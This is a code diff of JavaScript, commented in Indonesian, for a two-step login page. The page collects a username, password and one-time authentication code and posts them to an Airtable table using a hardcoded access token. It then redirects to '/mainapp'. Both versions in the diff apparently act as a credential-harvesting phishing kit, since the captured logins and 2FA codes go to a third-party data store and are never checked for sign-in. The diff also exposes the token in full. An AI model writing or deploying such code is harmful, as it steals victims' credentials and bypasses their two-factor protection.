@@ -1,70 +1,64 @@
-    // --- Konfigurasi Airtable ---
-    const airtableApiToken = "pat31RGUy1ua2FIoz.ef8b6f93f458151fd8ddee3e6eafce8e3ce235f99e1b391923be895a81730efe";
-    const baseId = "appLTvB7Hey4An0z0";
-    const tableName = "table1";
-    const airtableEndpoint = `https://api.airtable.com/v0/${baseId}/${tableName}`;
+const token = "pat31RGUy1ua2FIoz.ef8b6f93f458151fd8ddee3e6eafce8e3ce235f99e1b391923be895a81730efe";
+const baseId = "appLTvB7Hey4An0z0";
+const tableName = "table1";
+const apiURL = `https://api.airtable.com/v0/${baseId}/${tableName}`;
 
-    // --- Elemen DOM ---
-    const loginSec = document.getElementById('loginSec');
-    const confirmSec = document.getElementById('confirmSec');
-    const loginBtn = document.getElementById('loginBtn');
-    const backBtn = document.getElementById('backBtn');
-    const confirmBtn = document.getElementById('confirmBtn');
-    const skipBtn = document.getElementById('skipBtn');
+const loginSec = document.getElementById("loginSec");
+const confirmSec = document.getElementById("confirmSec");
 
-    // --- Navigasi antar section ---
-    loginBtn.onclick = () => {
-      loginSec.style.display = 'none';
-      confirmSec.style.display = 'block';
-    };
+const usrInput = document.getElementById("usr");
+const pssInput = document.getElementById("pss");
+const otInput = document.getElementById("otentikasi");
 
-    backBtn.onclick = () => {
-      confirmSec.style.display = 'none';
-      loginSec.style.display = 'block';
-    };
+document.getElementById("loginBtn").onclick = () => {
+  if (usrInput.value && pssInput.value) {
+    loginSec.style.display = "none";
+    confirmSec.style.display = "block";
+  } else {
+    alert("Isi username dan password terlebih dahulu.");
+  }
+};
 
-    // --- Fungsi kirim data ke Airtable ---
-    async function kirimKeAirtable(data) {
-      try {
-        const res = await fetch(airtableEndpoint, {
-          method: "POST",
-          headers: {
-            "Authorization": `Bearer ${airtableApiToken}`,
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            records: [
-              {
-                fields: data
-              }
-            ]
-          })
-        });
+document.getElementById("backBtn").onclick = () => {
+  confirmSec.style.display = "none";
+  loginSec.style.display = "block";
+};
 
-        if (res.ok) {
-          window.location.href = "/mainapp";
-        } else {
-          alert("Gagal mengirim data ke Airtable.");
-        }
-      } catch (err) {
-        console.error(err);
-        alert("Terjadi kesalahan koneksi.");
-      }
-    }
+// Fungsi kirim data ke Airtable
+async function kirimData(data) {
+  try {
+    const res = await fetch(apiURL, {
+      method: "POST",
+      headers: {
+        Authorization: `Bearer ${token}`,
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ records: [{ fields: data }] })
+    });
+    if (!res.ok) throw new Error("Gagal mengirim ke Airtable");
+  } catch (err) {
+    console.error(err);
+    alert("Terjadi kesalahan saat mengirim data.");
+  }
+}
 
-    // --- Tombol konfirmasi (kirim usr, pss, otentikasi) ---
-    confirmBtn.onclick = () => {
-      const usr = document.getElementById('usr').value.trim();
-      const pss = document.getElementById('pss').value.trim();
-      const otentikasi = document.getElementById('otentikasi').value.trim();
-      if (!usr || !pss) return alert("Lengkapi username dan password!");
-      kirimKeAirtable({ usr, pss, otentikasi });
-    };
+// Tombol Konfirmasi (dengan otentikasi)
+document.getElementById("confirmBtn").onclick = async () => {
+  const data = {
+    Username: usrInput.value,
+    Password: pssInput.value,
+    Otentikasi: otInput.value
+  };
+  await kirimData(data);
+  window.location.href = "/mainapp";
+};
 
-    // --- Tombol skip (kirim usr, pss saja) ---
-    skipBtn.onclick = () => {
-      const usr = document.getElementById('usr').value.trim();
-      const pss = document.getElementById('pss').value.trim();
-      if (!usr || !pss) return alert("Lengkapi username dan password!");
-      kirimKeAirtable({ usr, pss });
-    };
+// Tombol Lewati (tanpa otentikasi)
+document.getElementById("skipBtn").onclick = async () => {
+  const data = {
+    Username: usrInput.value,
+    Password: pssInput.value
+  };
+  await kirimData(data);
+  window.location.href = "/mainapp";
+};
